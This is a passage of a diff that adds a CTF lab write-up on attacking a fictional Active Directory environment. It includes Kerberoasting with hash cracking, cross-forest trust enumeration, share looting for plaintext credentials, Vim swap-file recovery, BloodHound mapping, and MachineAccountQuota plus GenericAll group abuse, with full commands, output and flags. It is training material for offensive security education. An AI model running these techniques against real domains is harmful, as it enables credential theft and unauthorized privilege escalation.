+    <span class="n">entry</span> <span class="o">=</span> <span class="s">'$krb5tgs$%d$*%s$%s$%s*$%s$%s'</span> <span class="o">%</span> <span class="p">(</span>
+        <span class="n">constants</span><span class="p">.</span><span class="n">EncryptionTypes</span><span class="p">.</span><span class="n">rc4_hmac</span><span class="p">.</span><span class="n">value</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">domain</span><span class="p">,</span> <span class="n">spn</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'~'</span><span class="p">),</span>
+        <span class="n">hexlify</span><span class="p">(</span><span class="n">decodedTGS</span><span class="p">[</span><span class="s">'ticket'</span><span class="p">][</span><span class="s">'enc-part'</span><span class="p">][</span><span class="s">'cipher'</span><span class="p">][:</span><span class="mi">16</span><span class="p">].</span><span class="n">asOctets</span><span class="p">()).</span><span class="n">decode</span><span class="p">(),</span>
+        <span class="n">hexlify</span><span class="p">(</span><span class="n">decodedTGS</span><span class="p">[</span><span class="s">'ticket'</span><span class="p">][</span><span class="s">'enc-part'</span><span class="p">][</span><span class="s">'cipher'</span><span class="p">][</span><span class="mi">16</span><span class="p">:].</span><span class="n">asOctets</span><span class="p">()).</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p>In this case, the <code class="language-plaintext highlighter-rouge">enc-part-&gt;cipher</code> field contains the service ticket which is encrypted with the service account’s password. We can run <code class="language-plaintext highlighter-rouge">describeTicket.py</code> and pipe the output to <code class="language-plaintext highlighter-rouge">john</code> for cracking.</p>
+
+<blockquote>
+  <p>If you want to learn more about how Kerberos works, check out our <a href="https://github.com/ASYNC-Security/W200-Preview-Public?tab=readme-ov-file#kerberoasting">public preview</a> of our W200 course.</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ describeTicket.py /tmp/krb5cc_1000
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Number of credentials in cache: 2
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : c6a42e5645c02296b49b5e3b26610ce07537f383ba7e26066d28c4f8af03e7f3
+[*] User Name                     : chloe.lim
+[*] User Realm                    : ANTENNAE.RV
+[*] Service Name                  : krbtgt/ANTENNAE.RV
+[*] Service Realm                 : ANTENNAE.RV
+[*] Start Time                    : 07/09/2025 08:45:27 AM
+[*] End Time                      : 07/09/2025 18:45:27 PM
+[*] RenewTill                     : 08/09/2025 08:45:27 AM
+[*] Flags                         : (0xe10000) renewable, initial, pre_authent, enc_pa_rep
+[*] KeyType                       : aes256_cts_hmac_sha1_96
+[*] Base64(key)                   : xqQuVkXAIpa0m147JmEM4HU384O6fiYGbSjE+K8D5/M=
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : krbtgt/ANTENNAE.RV
+[*]   Service Realm               : ANTENNAE.RV
+[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
+[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : 9ee0acdda8247fecc421ed5751706835
+[*] User Name                     : chloe.lim
+[*] User Realm                    : ANTENNAE.RV
+[*] Service Name                  : TERMSRV/vdi.antennae.rv
+[*] Service Realm                 : ANTENNAE.RV
+[*] Start Time                    : 07/09/2025 08:46:21 AM
+[*] End Time                      : 07/09/2025 18:45:27 PM
+[*] RenewTill                     : 08/09/2025 08:45:27 AM
+[*] Flags                         : (0xa10000) renewable, pre_authent, enc_pa_rep
+[*] KeyType                       : rc4_hmac
+[*] Base64(key)                   : nuCs3agkf+zEIe1XUXBoNQ==
+[*] Kerberoast hash               : $krb5tgs$23$*USER$ANTENNAE.RV$TERMSRV/vdi.antennae.rv*$f7a2c6216c08a17845806011049566b3$5[...snip...]0b6146b1e037b0fc3f81037ccc0260dd022ab44d39351b95027b1a57f400bb7f536a14a96e3e74e94ba
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : TERMSRV/vdi.antennae.rv
+[*]   Service Realm               : ANTENNAE.RV
+[*]   Encryption type             : rc4_hmac (etype 23)
+[-] Could not find the correct encryption key! Ticket is encrypted with rc4_hmac (etype 23), but no keys/creds were supplied
+</code></pre></div></div>
+
+<p>This “Kerberoast hash” can then be piped to <code class="language-plaintext highlighter-rouge">john</code>, like we did before, to crack the password.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ describeTicket.py /tmp/krb5cc_1000 | grep 'Kerberoast hash' | awk '{print $5}' | tee service_tickets.txt
+~$ john --wordlist=/usr/share/wordlists/rockyou.txt service_tickets.txt      
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tr4v15           (?)     
+1g 0:00:00:01 DONE (2025-09-07 08:55) 0.8474g/s 2630Kp/s 2630Kc/s 2630KC/s trabajadorasocial24..tr0ydawn
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+
+<blockquote>
+  <p>Some tools may attempt to <em>downgrade</em> the encryption type of the service ticket to <code class="language-plaintext highlighter-rouge">rc4_hmac</code> which may be a point of detection. Using <code class="language-plaintext highlighter-rouge">kinit</code> and <code class="language-plaintext highlighter-rouge">kvno</code> ensures that the service ticket is requested with the service account’s actual encryption type. See: <a href="https://trustedsec.com/blog/art_of_kerberoast">The Art of Detecting Kerberoast Attacaks</a>.</p>
+</blockquote>
+
+<h2 id="path-2-cross-forest-enumeration">Path 2: Cross-Forest Enumeration</h2>
+
+<p>Another way of obtaining the credentials for <code class="language-plaintext highlighter-rouge">svc_vdi</code> is through enumeration of the <code class="language-plaintext highlighter-rouge">backward.rv</code> domain, which has a <a href="https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust">two-way trust relationship</a> with the <code class="language-plaintext highlighter-rouge">antennae.rv</code> domain.</p>
+
+<p>We can identify this trust relationship by querying the <code class="language-plaintext highlighter-rouge">dc01.antennae.rv</code> domain controller for its trusted domains:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' --query "(objectClass=trustedDomain)" "cn flatName trustDirection trustType"
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
+LDAP        10.5.10.10      389    DC01             [+] Response for object: CN=backward.rv,CN=System,DC=antennae,DC=rv
+LDAP        10.5.10.10      389    DC01             cn                   backward.rv
+LDAP        10.5.10.10      389    DC01             trustDirection       3
+LDAP        10.5.10.10      389    DC01             trustType            2
+LDAP        10.5.10.10      389    DC01             flatName             backward
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">trustDirection</code> attribute indicates the direction of the trust relationship:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">1</code>: One-way incoming trust</li>
+  <li><code class="language-plaintext highlighter-rouge">2</code>: One-way outgoing trust</li>
+  <li><code class="language-plaintext highlighter-rouge">3</code>: Two-way trust</li>
+</ul>
+
+<p>The presence of a <code class="language-plaintext highlighter-rouge">trustDirection</code> value of <code class="language-plaintext highlighter-rouge">3</code> confirms that there is a two-way trust relationship between the <code class="language-plaintext highlighter-rouge">antennae.rv</code> and <code class="language-plaintext highlighter-rouge">backward.rv</code> domains - this means that users from either domain can access resources in the other domain.</p>
+
+<p>We can verify this by attempting to authenticate to the <code class="language-plaintext highlighter-rouge">backward.rv</code> domain controller <code class="language-plaintext highlighter-rouge">dc02.backward.rv</code> using the credentials for <code class="language-plaintext highlighter-rouge">chloe.lim@antennae.rv</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc02.backward.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' -d 'antennae.rv'
+LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:antennae.rv) (signing:None) (channel binding:Never) 
+LDAP        10.5.10.12      389    DC02             [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
+</code></pre></div></div>
+
+<p>With this trust relationship in place, we can enumerate the <code class="language-plaintext highlighter-rouge">backward.rv</code> domain for open and accessible shares. We’ll find that on the <code class="language-plaintext highlighter-rouge">srv01.backward.rv</code> machine, we have access to the <code class="language-plaintext highlighter-rouge">antennae.rv</code> and <code class="language-plaintext highlighter-rouge">Public</code> shares.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb srv01.backward.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' -d 'antennae.rv' --shares
+SMB         10.5.10.13      445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:backward.rv) (signing:True) (SMBv1:False)
+SMB         10.5.10.13      445    SRV01            [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
+SMB         10.5.10.13      445    SRV01            [*] Enumerated shares
+SMB         10.5.10.13      445    SRV01            Share           Permissions     Remark
+SMB         10.5.10.13      445    SRV01            -----           -----------     ------
+SMB         10.5.10.13      445    SRV01            ADMIN$                          Remote Admin
+SMB         10.5.10.13      445    SRV01            antennae.rv     READ            Shared folder for users in antennae.rv
+SMB         10.5.10.13      445    SRV01            backward.rv                     Shared folder for users in backward.rv
+SMB         10.5.10.13      445    SRV01            C$                              Default share
+SMB         10.5.10.13      445    SRV01            IPC$            READ            Remote IPC
+SMB         10.5.10.13      445    SRV01            Public          READ,WRITE      Shared folder for users in both antennae.rv and backward.rv
+</code></pre></div></div>
+
+<p>We can loot the <code class="language-plaintext highlighter-rouge">Public</code> share, and find a file called <code class="language-plaintext highlighter-rouge">note.txt</code> that contains the credentials for the <code class="language-plaintext highlighter-rouge">svc_vdi</code> account:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ smbclient.py 'chloe.lim':'BZCJsopuOPgH'@srv01.backward.rv                           
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use Public
+# ls
+drw-rw-rw-          0  Sun Sep  7 09:03:04 2025 .
+drw-rw-rw-          0  Sat Aug 30 04:36:43 2025 ..
+-rw-rw-rw-          0  Sat Aug 30 04:36:19 2025 .empty
+-rw-rw-rw-        181  Sat Aug 30 04:36:19 2025 note.txt
+-rw-rw-rw-         21  Sat Aug 30 04:36:19 2025 README.md
+# cat note.txt
+@Jolene, here are the creds for svc_vdi as you asked for earlier.
+
+Not sure why you need them anymore cuz our VDI project got canned last week, but whatever.
+
+svc_vdi
+tr4v15
+</code></pre></div></div>
+
+<h2 id="looting-shares">Looting Shares</h2>
+
+<p>After obtaining access to <code class="language-plaintext highlighter-rouge">svc_vdi</code>, we can use these credentials to re-enumerate shares on <code class="language-plaintext highlighter-rouge">dc01.antennae.rv</code> to look for any interesting files. We’ll find that we have read access to the <code class="language-plaintext highlighter-rouge">service-home</code> share.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb dc01.antennae.rv -u 'svc_vdi' -p 'tr4v15' --shares
+SMB         10.5.10.10      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:antennae.rv) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         10.5.10.10      445    DC01             [+] antennae.rv\svc_vdi:tr4v15 
+SMB         10.5.10.10      445    DC01             [*] Enumerated shares
+SMB         10.5.10.10      445    DC01             Share           Permissions     Remark
+SMB         10.5.10.10      445    DC01             -----           -----------     ------
+SMB         10.5.10.10      445    DC01             ADMIN$                          Remote Admin
+SMB         10.5.10.10      445    DC01             C$                              Default share
+SMB         10.5.10.10      445    DC01             IPC$            READ            Remote IPC
+SMB         10.5.10.10      445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.5.10.10      445    DC01             service-home    READ            Shared folder for services provisioned in antennae.rv
+SMB         10.5.10.10      445    DC01             SYSVOL          READ            Logon server share 
+</code></pre></div></div>
+
+<p>In this share, we’ll find <code class="language-plaintext highlighter-rouge">flag1.txt</code> which contains the first flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ smbclient.py 'svc_vdi':'tr4v15'@dc01.antennae.rv         
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+uType help for list of commands
+# use service-home
+# ls
+drw-rw-rw-          0  Sat Aug 30 08:15:51 2025 .
+drw-rw-rw-          0  Sat Aug 30 04:36:57 2025 ..
+-rw-rw-rw-         78  Sat Aug 30 04:37:04 2025 .env.sample.horizon
+-rw-rw-rw-      12289  Sat Aug 30 04:37:04 2025 .env.swp
+-rw-rw-rw-       1284  Sat Aug 30 04:37:04 2025 Connect-Horizon.ps1
+-rw-rw-rw-        925  Sat Aug 30 04:37:04 2025 Deploy-DesktopPool.ps1
+-rw-rw-rw-         62  Sat Aug 30 08:15:51 2025 flag1.txt
+# cat flag1.txt
+RV{roAStIn6_1IkE_n0_7OMOrroW_e8cac89a3efd99b6c843857ac8faa276}
+# 
+</code></pre></div></div>
+
+<h1 id="flag-2-access-uncontrolled">Flag 2: Access (Un)controlled</h1>
+
+<p><img src="/assets/img/rv-sept/2.png" alt="" /></p>
+
+<p>Based on the description of the challenge, we’ll know that the next flag requires us to obtain local access to the <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> machine. This need not be administrative access, as it is mentioned that the flag can be read by all local users.</p>
+
+<p>In the <code class="language-plaintext highlighter-rouge">service-home</code> share, we find a <code class="language-plaintext highlighter-rouge">.env.swp</code> file, which is a <a href="https://vi.stackexchange.com/questions/177/what-is-the-purpose-of-swap-files">Vim swap file</a>. A quick google search reveals that: <code class="language-plaintext highlighter-rouge">Swap files store changes you've made to the buffer. If Vim or your computer crashes, they allow you to recover those changes.</code>. You may also find that after opening a file in <code class="language-plaintext highlighter-rouge">vim</code>, a <code class="language-plaintext highlighter-rouge">.&lt;filename&gt;.swp</code> file is created in the same directory.</p>
+
+<p>We can “recover” the contents of this swap file using the <code class="language-plaintext highlighter-rouge">vim -r</code> command, and find that it contains credentials for the <code class="language-plaintext highlighter-rouge">jolene.ong</code> user.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ vim -r .env.swp
+:w .env.swp.recv
+
+~$ cat .env.swp.recv      
+HORIZON_SERVER=broker.antennae.rv
+HORIZON_USER=jolene.ong
+HORIZON_PASS=BoXALrqvqPd3
+</code></pre></div></div>
+
+<p>We can verify that these credentials are valid by attempting to authenticate to the <code class="language-plaintext highlighter-rouge">antennae.rv</code> domain controller <code class="language-plaintext highlighter-rouge">dc01.antennae.rv</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'jolene.ong' -p 'BoXALrqvqPd3'                                                                            
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\jolene.ong:BoXALrqvqPd3 
+</code></pre></div></div>
+
+<p>At this point, we can run a <a href="https://github.com/SpecterOps/BloodHound">bloodhound</a> collector to begin mapping out the Active Directory environment. We can use 
+<a href="https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce">bloodhound-ce-python</a> for this.</p>
+
+<blockquote>
+  <p>Note that this could have been done earlier as well, but was not necessary for capturing the first flag.</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ bloodhound-ce-python -u 'jolene.ong' -p 'BoXALrqvqPd3' -d 'antennae.rv' -c 'All' -ns '10.5.10.10' --zip
+INFO: BloodHound.py for BloodHound Community Edition
+INFO: Found AD domain: antennae.rv
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.antennae.rv
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: dc01.antennae.rv
+INFO: Found 22 users
+INFO: Found 58 groups
+INFO: Found 2 gpos
+INFO: Found 3 ous
+INFO: Found 19 containers
+INFO: Found 1 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: SQL01.antennae.rv
+INFO: Querying computer: DC01.antennae.rv
+INFO: Done in 00M 04S
+INFO: Compressing output into 20250907091433_bloodhound.zip
+</code></pre></div></div>
+
+<p>Following the <a href="https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart">BloodHound Documentation</a>, we can ingest the resulting <code class="language-plaintext highlighter-rouge">zip</code> file into <code class="language-plaintext highlighter-rouge">BloodHound</code> and begin analyzing the data.</p>
+
+<p><img src="/assets/img/rv-sept/bhce.png" alt="" /></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">BloodHound</code>’s path-finding feature, we can identify that <code class="language-plaintext highlighter-rouge">jolene.ong</code> is a member of the <code class="language-plaintext highlighter-rouge">Development</code> group which has some <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/ace"><code class="language-plaintext highlighter-rouge">Access Control Entries (ACEs)</code></a> on the <code class="language-plaintext highlighter-rouge">senior-developers</code> and <code class="language-plaintext highlighter-rouge">intern-developers</code> group.</p>
+
+<h2 id="identifying-privileged-groups">Identifying Privileged Groups</h2>
+
+<p>We can take the “easy” route and simply abuse both of these ACEs and add ourselves to both groups, which will ultimately lead us in the right direction. However, you may want to take a more methodical approach and identify which of these groups is more “privileged”.</p>
+
+<p>Firstly, we can use <code class="language-plaintext highlighter-rouge">jolene.ong</code>’s credentials to re-enumerate the open shares in <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>, and find that we have read access to the <code class="language-plaintext highlighter-rouge">Tools</code> share.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb sql01.antennae.rv -u 'jolene.ong' -p 'BoXALrqvqPd3' --shares
+SMB         10.5.10.11      445    SQL01            [*] Windows Server 2022 Build 20348 x64 (name:SQL01) (domain:antennae.rv) (signing:True) (SMBv1:False)
+SMB         10.5.10.11      445    SQL01            [+] antennae.rv\jolene.ong:BoXALrqvqPd3 
+SMB         10.5.10.11      445    SQL01            [*] Enumerated shares
+SMB         10.5.10.11      445    SQL01            Share           Permissions     Remark
+SMB         10.5.10.11      445    SQL01            -----           -----------     ------
+SMB         10.5.10.11      445    SQL01            ADMIN$                          Remote Admin
+SMB         10.5.10.11      445    SQL01            C$                              Default share
+SMB         10.5.10.11      445    SQL01            IPC$            READ            Remote IPC
+SMB         10.5.10.11      445    SQL01            Tools           READ            Shared folder for tools
+</code></pre></div></div>
+
+<p>Inside the <code class="language-plaintext highlighter-rouge">Tools</code> share, we find a file called <code class="language-plaintext highlighter-rouge">test-connection.ps1</code> which contains a script that attempts to connect to the <code class="language-plaintext highlighter-rouge">SSH</code> service on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ smbclient.py 'jolene.ong':'BoXALrqvqPd3'@sql01.antennae.rv
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use tools
+# ls
+drw-rw-rw-          0  Sat Aug 30 04:37:19 2025 .
+drw-rw-rw-          0  Sat Aug 30 04:37:13 2025 ..
+-rw-rw-rw-        854  Sat Aug 30 04:37:19 2025 test-connection.ps1
+# cat test-connection.ps1
+Import-Module Posh-SSH
+
+$user = 'danish.hakim'
+$host = 'sql01.antennae.rv'
+$port = 22
+
+$securePass = Read-Host "Enter SSH password for $user@$host" -AsSecureString
+
+$creds = New-Object System.Management.Automation.PSCredential($user, $securePass)
+
+try {
+    $session = New-SSHSession `
+        -ComputerName $host `
+        -Port $port `
+        -Credential $creds `
+        -AcceptKey:$true
+
+    if ($session -and $session.SessionId) {
+        $result = Invoke-SSHCommand -SessionId $session.SessionId -Command 'hostname'
+        $result.Output.Trim()
+
+        Remove-SSHSession -SessionId $session.SessionId | Out-Null
+        Write-Host "goodbye" -ForegroundColor Green
+    }
+    else {
+        Write-Host "err: failed to establish SSH session." -ForegroundColor Red
+    }
+}
+catch {
+    Write-Host "err: $($_.Exception.Message)" -ForegroundColor Red
+}
+# 
+</code></pre></div></div>
+
+<p>In the script, we see that the <code class="language-plaintext highlighter-rouge">danish.hakim</code> user seems to be the intended user for connecting to the <code class="language-plaintext highlighter-rouge">SSH</code> service. On <code class="language-plaintext highlighter-rouge">BloodHound</code>, we’ll find that the <code class="language-plaintext highlighter-rouge">danish.hakim</code> user is a member of the <code class="language-plaintext highlighter-rouge">senior-developers</code> group.</p>
+
+<p><img src="/assets/img/rv-sept/dhkm.png" alt="" /></p>
+
+<p>Based on this, we can reasonably conclude that the <code class="language-plaintext highlighter-rouge">senior-developers</code> group <em>may</em> have <code class="language-plaintext highlighter-rouge">SSH</code> access to <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>.</p>
+
+<h2 id="machineaccountquota">MachineAccountQuota</h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">GenericAll</code> privilege that <code class="language-plaintext highlighter-rouge">jolene.ong</code> has on the <code class="language-plaintext highlighter-rouge">senior-developers</code> group allows her to add herself to that group, but this may be disruptive and not an attack that you want to perform in a real-world scenario without proper authorization. Instead, we can use the <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/default-workstation-numbers-join-domain"><code class="language-plaintext highlighter-rouge">MachineAccountQuota</code></a> to create a new computer account in the <code class="language-plaintext highlighter-rouge">antennae.rv</code> domain, and then add that computer account to the <code class="language-plaintext highlighter-rouge">senior-developers</code> group.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">MachineAccountQuota</code> value can be enumerated using the <code class="language-plaintext highlighter-rouge">maq</code> module from <code class="language-plaintext highlighter-rouge">nxc</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'jolene.ong' -p 'BoXALrqvqPd3' -M maq                                              
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\jolene.ong:BoXALrqvqPd3 
+MAQ         10.5.10.10      389    DC01             [*] Getting the MachineAccountQuota
+MAQ         10.5.10.10      389    DC01             MachineAccountQuota: 10
+</code></pre></div></div>
+
+<p>The default value for <code class="language-plaintext highlighter-rouge">MachineAccountQuota</code> is <code class="language-plaintext highlighter-rouge">10</code>, which means that any authenticated user can create up to <code class="language-plaintext highlighter-rouge">10</code> computer accounts in the domain. We can use the <code class="language-plaintext highlighter-rouge">nxc</code> tool to create a new computer account called <code class="language-plaintext highlighter-rouge">gatari$</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb dc01.antennae.rv -u 'jolene.ong' -p 'BoXALrqvqPd3' -M add-computer -o NAME="gatari$" PASSWORD='P@ssw0rd'
+SMB         10.5.10.10      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:antennae.rv) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         10.5.10.10      445    DC01             [+] antennae.rv\jolene.ong:BoXALrqvqPd3 
+ADD-COMP... 10.5.10.10      445    DC01             Successfully added the machine account: "gatari$" with Password: "P@ssw0rd"
+</code></pre></div></div>
+
+<h2 id="abusing-genericall-on-group">Abusing GenericAll on Group</h2>
+
+<p>This new computer account can then be used to authenticate to the <code class="language-plaintext highlighter-rouge">antennae.rv</code> domain controller <code class="language-plaintext highlighter-rouge">dc01.antennae.rv</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'gatari$' -p 'P@ssw0rd'                                                           
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\gatari$:P@ssw0rd 
+</code></pre></div></div>
+
+<p>With this computer account added, we can now use <code class="language-plaintext highlighter-rouge">jolene.ong</code> to add <code class="language-plaintext highlighter-rouge">gatari$</code> to the <code class="language-plaintext highlighter-rouge">senior-developers</code> group. The <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a> tool can be used for this purpose:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ bloodyAD --host 'dc01.antennae.rv' -u 'jolene.ong' -p 'BoXALrqvqPd3' add groupMember 'senior-developers' 'gatari$'
+[+] gatari$ added to senior-developers
+</code></pre></div></div>
+
+<p>With this done, we can now authenticate to the <code class="language-plaintext highlighter-rouge">SSH</code> service on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> using the <code class="language-plaintext highlighter-rouge">gatari$</code> computer account:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ssh sql01.antennae.rv -u 'gatari$' -p 'P@ssw0rd'  
+SSH         10.5.10.11      22     sql01.antennae.rv [*] SSH-2.0-OpenSSH_for_Windows_9.8 Win32-OpenSSH-GitHub
+SSH         10.5.10.11      22     sql01.antennae.rv [+] gatari$:P@ssw0rd  Windows - Shell access!
+</code></pre></div></div>
+
+<p>Do note that <code class="language-plaintext highlighter-rouge">WinRM</code> or <code class="language-plaintext highlighter-rouge">RDP</code> could have also been used instead of <code class="language-plaintext highlighter-rouge">SSH</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc winrm sql01.antennae.rv -u 'gatari$' -p 'P@ssw0rd'
+WINRM       10.5.10.11      5985   SQL01            [*] Windows Server 2022 Build 20348 (name:SQL01) (domain:antennae.rv) 
+WINRM       10.5.10.11      5985   SQL01            [+] antennae.rv\gatari$:P@ssw0rd (Pwn3d!)
+
+~$ nxc rdp sql01.antennae.rv -u 'gatari$' -p 'P@ssw0rd'  
+RDP         10.5.10.11      3389   SQL01            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SQL01) (domain:antennae.rv) (nla:True)
+RDP         10.5.10.11      3389   SQL01            [+] antennae.rv\gatari$:P@ssw0rd 
+</code></pre></div></div>
+
+<p>We can now connect to the <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> machine and read the <code class="language-plaintext highlighter-rouge">flag2.txt</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ sshpass -p 'P@ssw0rd' ssh 'gatari$'@sql01.antennae.rv
+
+PS C:\&gt; cat flag2.txt
+RV{d@ngER0US_4cc3$S_C0n7Rol_1!sts!_6daa59eff6fd00657e9fb802c0078a4c}
+</code></pre></div></div>
+
+<h1 id="flag-3-moving-laterally">Flag 3: Moving Laterally</h1>
+
+<p><img src="/assets/img/rv-sept/3.png" alt="" /></p>
+
+<p>After obtaining local access to <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>, we can begin enumerating the machine for any interesting files or credentials. After some searching (or running <code class="language-plaintext highlighter-rouge">tree /f /a</code>), we’ll find a file at <code class="language-plaintext highlighter-rouge">C:\Users\Public\test.ps1</code> that contains credentials for <code class="language-plaintext highlighter-rouge">wei.jie.tan</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users&gt; cat C:\Users\Public\test.ps1
+$username = 'wei.jie.tan'
+$password = 'klDCzcAiLGc2'
+$securePass = ConvertTo-SecureString $password -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential($username, $securePass)
+$scriptBlock = {
+    $targetFile = 'C:\temp.txt'
+    $timestamp  = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
+    "test =&gt; $timestamp" |
+        Out-File -FilePath $targetFile -Encoding UTF8 -Append
+}
+
+Start-Process -FilePath pwsh -ArgumentList '-NoProfile','-Command',(
+    [ScriptBlock]::Create($scriptBlock.ToString())
+) -Credential $creds -Wait -WindowStyle Hidden
+</code></pre></div></div>
+
+<p>In <code class="language-plaintext highlighter-rouge">BloodHound</code>, we’ll see that <code class="language-plaintext highlighter-rouge">wei.jie.tan</code> is also a member of the <code class="language-plaintext highlighter-rouge">senior-developers</code> group - which means that we can use this user to <code class="language-plaintext highlighter-rouge">SSH</code> into <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> as well.</p>
+
+<p><img src="/assets/img/rv-sept/wjt.png" alt="" /></p>
+
+<p>We can use these credentials to authenticate to the <code class="language-plaintext highlighter-rouge">SSH</code> service on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>, and grab the <code class="language-plaintext highlighter-rouge">flag3.txt</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ sshpass -p 'klDCzcAiLGc2' ssh 'wei.jie.tan'@sql01.antennae.rv
+
+PS C:\Users\wei.jie.tan\Desktop&gt; cat flag3.txt
